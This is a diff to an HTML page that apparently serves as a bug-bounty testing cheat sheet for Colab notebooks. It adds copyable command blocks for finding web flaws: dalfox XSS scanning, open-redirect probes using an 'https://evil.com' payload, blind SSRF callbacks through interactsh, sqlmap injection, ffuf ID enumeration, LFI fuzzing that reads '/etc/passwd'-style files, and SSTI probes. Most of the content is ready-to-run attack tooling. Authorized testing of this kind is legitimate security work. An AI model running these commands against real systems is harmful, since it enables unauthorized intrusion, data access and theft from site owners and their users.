@@ -8307,6 +8307,347 @@ for pattern, count, path in results_summary:
               </div>
             </div>
           </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>XSS Validation with dalfox</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# XSS Validation with dalfox
+#   dalfox is the best automated XSS scanner for parameter-based XSS.
+#   -b your BXSS hunter callback for blind XSS detection
+#   --skip-bav skip basic attribute value checks (speeds up scan)
+#   --only-discovery if you want params only, no payload firing
+
+os.system("go install github.com/hahwul/dalfox/v2@latest")
+
+!cat "$WORKDIR/xss_candidates.txt" \
+  | ~/go/bin/dalfox pipe \
+    --silence \
+    --no-color \
+    --skip-bav \
+    --timeout 10 \
+    --delay 300 \
+    -o "$WORKDIR/xss_confirmed.txt" \
+  2>/dev/null
+
+print("Confirmed XSS:")
+!wc -l "$WORKDIR/xss_confirmed.txt"
+!cat "$WORKDIR/xss_confirmed.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Open Redirect — Validation with qsreplace + httpx</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Open Redirect Validation
+#   qsreplace replaces all parameter values with your payload.
+#   httpx -match-regex confirms redirect destination in response.
+
+os.system("go install github.com/tomnomnom/qsreplace@latest")
+
+REDIRECT_PAYLOAD = "https://evil.com"
+
+!cat "$WORKDIR/redirect_candidates.txt" \
+  | ~/go/bin/qsreplace "$REDIRECT_PAYLOAD" \
+  | ~/go/bin/httpx \
+    -silent \
+    -sc \
+    -location \
+    -mc 301,302,303,307,308 \
+    -match-regex "evil\.com" \
+  | tee "$WORKDIR/redirect_confirmed.txt"
+
+print("\nConfirmed Open Redirects:")
+!wc -l "$WORKDIR/redirect_confirmed.txt"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>SSRF — Probe with Interactsh Callback</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# SSRF Validation with interactsh (out-of-band detection)
+#   interactsh-client gives you a unique OOB callback domain.
+#   Any DNS/HTTP pingback confirms blind SSRF.
+
+os.system("go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
+
+# Step 1: Generate your interactsh callback URL first
+# Run this in a SEPARATE cell and note the URL it gives you
+!~/go/bin/interactsh-client &
+
+# Step 2: Replace this with YOUR interactsh URL
+INTERACTSH_URL = "YOUR_UNIQUE_ID.oast.pro"
+
+!cat "$WORKDIR/ssrf_candidates.txt" \
+  | ~/go/bin/qsreplace "https://$INTERACTSH_URL" \
+  | ~/go/bin/httpx \
+    -silent \
+    -sc \
+    -timeout 10 \
+  | tee "$WORKDIR/ssrf_probed.txt"
+
+# Step 3: Monitor interactsh-client terminal output for callbacks
+# Any DNS/HTTP hit = confirmed SSRF
+print("\nSSRF probes sent. Monitor interactsh-client output for callbacks.")
+print(f"Probed {open(f'{WORKDIR}/ssrf_probed.txt').read().count(chr(10))} endpoints")
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>SQLi — sqlmap on Candidates</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# SQLi Validation with sqlmap
+#   --batch       non-interactive mode for Colab
+#   --level 2     slightly above default for header injection
+#   --risk 1      safe risk level; do not increase without scope confirmation
+#   --random-agent rotate UA to reduce WAF fingerprinting
+#   -o            enable all optimizations
+#   --output-dir  keep results organized
+
+!sqlmap \
+  -m "$WORKDIR/sqli_candidates.txt" \
+  --batch \
+  --level 2 \
+  --risk 1 \
+  --random-agent \
+  --threads 5 \
+  -o \
+  --output-dir="$WORKDIR/sqlmap_output" \
+  2>/dev/null \
+  | tee "$WORKDIR/sqlmap_results.txt"
+
+print("\nSQLmap complete. Results:")
+!ls "$WORKDIR/sqlmap_output/"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>IDOR — Automated ID Enumeration with ffuf</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# IDOR Validation with ffuf
+#   Extract endpoints with numeric/UUID parameters from idor_candidates.txt
+#   Replace the ID value with FUZZ and brute-force a range.
+#   Filter by content-length variance — identical length = same response = no IDOR.
+
+os.system("go install github.com/ffuf/ffuf/v2@latest")
+
+# Generate a numeric ID wordlist (1-1000)
+!seq 1 1000 > "$WORKDIR/ids.txt"
+
+# Extract one high-value endpoint from IDOR candidates to test
+# Manually inspect idor_candidates.txt and pick your target URL
+# Replace the ID with FUZZ before running ffuf
+
+IDOR_URL = "https://target.com/api/user?id=FUZZ"  # Replace with actual URL
+
+!~/go/bin/ffuf \
+  -u "$IDOR_URL" \
+  -w "$WORKDIR/ids.txt" \
+  -mc 200 \
+  -t 20 \
+  -rate 10 \
+  -o "$WORKDIR/idor_ffuf.json" \
+  -of json \
+  2>/dev/null
+
+print("IDOR ffuf results:")
+!cat "$WORKDIR/idor_ffuf.json" | python3 -c "
+import json,sys
+d = json.load(sys.stdin)
+results = d.get('results', [])
+sizes = [r['length'] for r in results]
+if sizes:
+    baseline = max(set(sizes), key=sizes.count)
+    anomalies = [r for r in results if r['length'] != baseline]
+    print(f'Total hits: {len(results)}')
+    print(f'Baseline response size: {baseline}')
+    print(f'Anomalous responses (potential IDOR): {len(anomalies)}')
+    for r in anomalies[:10]:
+        print(f'  ID={r[\"input\"][\"FUZZ\"]}  size={r[\"length\"]}  status={r[\"status\"]}')
+"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>LFI — Path Traversal with ffuf</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# LFI Validation
+#   Use a dedicated LFI payload wordlist.
+#   Match on known file content signatures in response body.
+
+os.system("wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt -O $WORKDIR/lfi_payloads.txt")
+
+# Pick one LFI candidate URL and replace the param value with FUZZ
+LFI_URL = "https://target.com/page?file=FUZZ"  # Replace with actual candidate
+
+!~/go/bin/ffuf \
+  -u "$LFI_URL" \
+  -w "$WORKDIR/lfi_payloads.txt" \
+  -mc 200 \
+  -mr "root:x:|\\[boot loader\\]|\\[extensions\\]" \
+  -t 20 \
+  -rate 10 \
+  -o "$WORKDIR/lfi_confirmed.json" \
+  -of json \
+  2>/dev/null
+
+print("LFI confirmed hits:")
+!cat "$WORKDIR/lfi_confirmed.json" | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+results=d.get('results',[])
+print(f'Confirmed LFI payloads: {len(results)}')
+for r in results[:10]:
+    print(f'  Payload: {r[\"input\"][\"FUZZ\"]}')
+"
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>SSTI — Detection with tplmap or Manual Probes</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# SSTI Validation
+#   Inject math probes first ({{7*7}}, ${7*7}, #{7*7}).
+#   A 49 in the response body = confirmed template injection.
+
+os.system("git clone --depth 1 https://github.com/epinna/tplmap /opt/tplmap 2>/dev/null || true")
+os.system("pip install -q requests")
+
+# Quick math probe across all SSTI candidates
+import requests, urllib.parse
+
+PROBES = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${7*7}", "*{7*7}"]
+EXPECTED = "49"
+
+candidates = open(f"{WORKDIR}/ssti_candidates.txt").read().splitlines()
+
+confirmed = []
+for url in candidates[:50]:   # cap at 50 for Colab runtime
+    for probe in PROBES:
+        try:
+            # Inject into each parameter value
+            fuzzed = urllib.parse.urlparse(url)
+            params = urllib.parse.parse_qs(fuzzed.query)
+            for param in params:
+                params[param] = [probe]
+                test_url = url.split("?")[0] + "?" + urllib.parse.urlencode(params, doseq=True)
+                r = requests.get(test_url, timeout=8, allow_redirects=False)
+                if EXPECTED in r.text:
+                    confirmed.append((test_url, probe, param))
+                    print(f"[CONFIRMED SSTI] {test_url}")
+                    print(f"  Param: {param}  Probe: {probe}")
+        except Exception:
+            continue
+
+print(f"\nTotal confirmed SSTI: {len(confirmed)}")
+</pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="sec">
+            <div class="sh open">
+              <div class="st"><span class="sd"></span>Final Triage Summary</div>
+              <span class="stg open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3"/></svg></span>
+            </div>
+            <div class="sb open">
+              <div class="cb">
+                <div class="cbh"><span class="cl">bash</span></div>
+                <button class="cpb sbanimated-btn"><svg class="btn-icon copy-icon" style="--icon-color: var(--accent, #4b5563)" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect class="copy-back" x="9" y="9" width="13" height="13" rx="2" ry="2"/><path class="copy-front" d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
+                <pre>
+# Final consolidated summary of confirmed findings
+
+import os
+
+FINDING_FILES = {
+    "XSS (dalfox confirmed)":      f"{WORKDIR}/xss_confirmed.txt",
+    "Open Redirect (confirmed)":   f"{WORKDIR}/redirect_confirmed.txt",
+    "SQLi (sqlmap output)":        f"{WORKDIR}/sqlmap_results.txt",
+    "IDOR (ffuf anomalies)":       f"{WORKDIR}/idor_ffuf.json",
+    "LFI (ffuf confirmed)":        f"{WORKDIR}/lfi_confirmed.json",
+    "SSRF (probed)":               f"{WORKDIR}/ssrf_probed.txt",
+    "Secrets from JS":             f"{WORKDIR}/js_secrets.txt",
+    "Arjun hidden params":         f"{WORKDIR}/arjun_params.json",
+}
+
+print("\n" + "="*60)
+print(f"{'CATEGORY':<35} {'LINES/SIZE':>10}")
+print("="*60)
+for label, path in FINDING_FILES.items():
+    if os.path.exists(path):
+        lines = int(os.popen(f"wc -l < '{path}'").read().strip() or 0)
+        size  = os.path.getsize(path)
+        flag  = " ◄ REVIEW" if lines > 0 and size > 10 else ""
+        print(f"{label:<35} {lines:>10} lines{flag}")
+    else:
+        print(f"{label:<35} {'NOT FOUND':>10}")
+print("="*60)
+print(f"\nAll findings saved under: {WORKDIR}/")
+</pre>
+              </div>
+            </div>
+          </div>
+
         </div>
 
         <!-- PHASE 15 FILE GENERATOR -->
